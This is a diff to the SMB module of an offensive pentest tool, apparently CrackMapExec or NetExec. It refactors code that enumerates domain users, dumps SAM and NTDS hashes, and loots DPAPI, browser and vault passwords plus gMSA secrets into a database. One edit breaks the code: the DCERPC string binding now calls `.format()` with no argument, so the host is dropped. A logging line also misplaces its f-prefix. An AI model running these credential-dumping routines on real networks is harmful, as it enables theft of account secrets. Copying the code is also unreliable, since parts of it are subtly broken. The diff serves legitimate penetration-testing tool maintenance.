@@ -1222,7 +1222,7 @@ class smb(connection):
                     self.logger.highlight('{}\\{:<30}'.format(domain, host_clean))
                 break
             except Exception as e:
-                self.logger.fail('Error enumerating domain hosts using dc ip {}: {}'.format(dc_ip, e))
+                self.logger.fail(f"Error enumerating domain hosts using dc ip {dc_ip}: {e}")
                 break
         return hosts
 
@@ -1332,13 +1332,14 @@ class smb(connection):
         }
 
         try:
-            string_binding = KNOWN_PROTOCOLS[self.args.port]['bindstr'].format(self.host if not self.kerberos else self.hostname + '.' + self.domain)
-            logging.debug('StringBinding {}'.format(string_binding))
+            full_hostname = self.host if not self.kerberos else self.hostname + '.' + self.domain
+            string_binding = KNOWN_PROTOCOLS[self.args.port]['bindstr'].format()
+            logging.debug(f"StringBinding {string_binding}")
             rpc_transport = transport.DCERPCTransportFactory(string_binding)
             rpc_transport.set_dport(self.args.port)
 
             if KNOWN_PROTOCOLS[self.args.port]['set_host']:
-                rpc_transport.setRemoteHost(self.host if not self.kerberos else self.hostname + '.' + self.domain)
+                rpc_transport.setRemoteHost(full_hostname)
 
             if hasattr(rpc_transport, 'set_credentials'):
                 # This method exists only for selected protocol sequences.
@@ -1353,7 +1354,7 @@ class smb(connection):
 
             dce.connect()
         except Exception as e:
-            self.logger.fail('Error creating DCERPC connection: {}'.format(e))
+            self.logger.fail(f"Error creating DCERPC connection: {e}")
             return entries
 
         # Want encryption? Uncomment next line
@@ -1415,7 +1416,7 @@ class smb(connection):
                     user = item['Name']
                     sid_type = SID_NAME_USE.enumItems(item['Use']).name
                     self.logger.highlight("f{rid}: {domain}\\{user} ({sid_type})")
-                    entries.append({'rid': rid, 'domain': domain, 'username': user, 'sidtype': sid_type})
+                    entries.append({"rid": rid, "domain": domain, "username": user, "sidtype": sid_type})
             so_far += simultaneous
         dce.disconnect()
         return entries
@@ -1430,16 +1431,16 @@ class smb(connection):
                 self.logger.fail(f"Error writing file to share {self.args.share}: {e}")
 
     def get_file(self):
-        self.logger.display('Copying {} to {}'.format(self.args.get_file[0], self.args.get_file[1]))
+        self.logger.display(f"Copying {self.args.get_file[0]} to {self.args.get_file[1]}")
         file_handle = self.args.get_file[1]
         if self.args.append_host:
-            file_handle = self.hostname + "-" + self.args.get_file[1]
+            file_handle = f"{self.hostname}-{self.args.get_file[1]}"
         with open(file_handle, 'wb+') as file:
             try:
                 self.conn.getFile(self.args.share, self.args.get_file[0], file.write)
-                self.logger.success('File {} was transferred to {}'.format(self.args.get_file[0], file_handle))
+                self.logger.success(f"File {self.args.get_file[0]} was transferred to {file_handle}")
             except Exception as e:
-                self.logger.fail('Error reading file {}: {}'.format(self.args.share, e))
+                self.logger.fail(f"Error reading file {self.args.share}: {e}")
 
     def enable_remoteops(self):
         if self.remote_ops is not None and self.bootkey is not None:
@@ -1472,7 +1473,7 @@ class smb(connection):
                 isRemote=True,
                 perSecretCallback=lambda secret: add_sam_hash(secret, host_id))
 
-            self.logger.display('Dumping SAM hashes')
+            self.logger.display("Dumping SAM hashes")
             SAM.dump()
             SAM.export(self.output_filename)
             self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
@@ -1489,7 +1490,7 @@ class smb(connection):
 
         if self.args.pvk is not None:
             try:
-                self.pvkbytes = open(self.args.pvk, 'rb').read()
+                self.pvkbytes = open(self.args.pvk, "rb").read()
                 self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
             except Exception as e:
                 logging.error(str(e))
@@ -1613,12 +1614,9 @@ class smb(connection):
             self.logger.debug(f"Error while looting credentials: {e}")
 
         for credential in credentials:
-            self.logger.highlight("[%s][CREDENTIAL] %s - %s:%s" % (
-                credential.winuser,
-                credential.target,
-                credential.username,
-                credential.password
-            ))
+            self.logger.highlight(
+                f"[{credential.winuser}][CREDENTIAL] {credential.target} - {credential.username}:{credential.password}"
+            )
             self.db.add_dpapi_secrets(
                 target.address,
                 "CREDENTIAL",
@@ -1676,8 +1674,8 @@ class smb(connection):
         except Exception as e:
             self.logger.debug(f"Error while looting vaults: {e}")
         for vault in vaults:
-            if vault.type == 'Internet Explorer':
-                resource = vault.resource + ' -' if vault.resource != '' else '-'
+            if vault.type == "Internet Explorer":
+                resource = vault.resource + " -" if vault.resource != "" else "-"
                 self.logger.highlight(f"[{vault.winuser}][IEX] {resource} - {vault.username}:{vault.password}")
                 self.db.add_dpapi_secrets(
                     target.address,
@@ -1695,13 +1693,13 @@ class smb(connection):
         except Exception as e:
             self.logger.debug(f"Error while looting firefox: {e}")
         for credential in firefox_credentials:
-            url = credential.url + ' -' if credential.url != '' else '-'
+            url = credential.url + " -" if credential.url != "" else "-"
             self.logger.highlight(
                 f"[{credential.winuser}][FIREFOX] {url} {credential.username}:{credential.password}"
             )
             self.db.add_dpapi_secrets(
                 target.address,
-                'FIREFOX',
+                "FIREFOX",
                 credential.winuser,
                 credential.username,
                 credential.password,
@@ -1720,7 +1718,7 @@ class smb(connection):
                 data = bytes.fromhex(secret.split("_")[4].split(":")[1])
                 blob = MSDS_MANAGEDPASSWORD_BLOB()
                 blob.fromString(data)
-                currentPassword = blob['CurrentPassword'][:-2]
+                currentPassword = blob["CurrentPassword"][:-2]
                 ntlm_hash = MD4.new()
                 ntlm_hash.update(currentPassword)
                 passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
@@ -1768,18 +1766,18 @@ class smb(connection):
             else:
                 ntds_hash = ntds_hash.split(" ")[0]
                 self.logger.highlight(ntds_hash)
-            if ntds_hash.find('$') == -1:
-                if ntds_hash.find('\\') != -1:
-                    domain, hash = ntds_hash.split('\\')
+            if ntds_hash.find("$") == -1:
+                if ntds_hash.find("\\") != -1:
+                    domain, hash = ntds_hash.split("\\")
                 else:
                     domain = self.domain
                     hash = ntds_hash
 
                 try:
-                    username, _, lmhash, nthash, _, _, _ = hash.split(':')
-                    parsed_hash = ':'.join((lmhash, nthash))
+                    username, _, lmhash, nthash, _, _, _ = hash.split(":")
+                    parsed_hash = ":".join((lmhash, nthash))
                     if validate_ntlm(parsed_hash):
-                        self.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)
+                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
                         add_ntds_hash.added_to_db += 1
                         return
                     raise
@@ -1824,16 +1822,15 @@ class smb(connection):
         )
 
         try:
-            self.logger.success('Dumping the NTDS, this could take a while so go grab a redbull...')
+            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
             NTDS.dump()
-            self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(
-                highlight(add_ntds_hash.ntds_hashes),
-                self.output_filename + '.ntds',
-                highlight(add_ntds_hash.added_to_db)
-            ))
+            ntds_outfile = f"{self.output_filename}.ntds"
+            self.logger.success(
+                f"Dumped {highlight(add_ntds_hash.ntds_hashes)} NTDS hashes to {ntds_outfile} of which {highlight(add_ntds_hash.added_to_db)} were added to the database"
+            )
             self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
-            self.logger.display(f"cat {self.output_filename + '.ntds'} | grep -iv disabled | cut -d ':' -f1")
-            self.logger.display(f"grep -iv disabled {self.output_filename + '.ntds'} | cut -d ':' -f1")
+            self.logger.display(f"cat {ntds_outfile} | grep -iv disabled | cut -d ':' -f1")
+            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
         except Exception as e:
             # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
             # We don't store the resume file if this error happened, since this error is related to lack
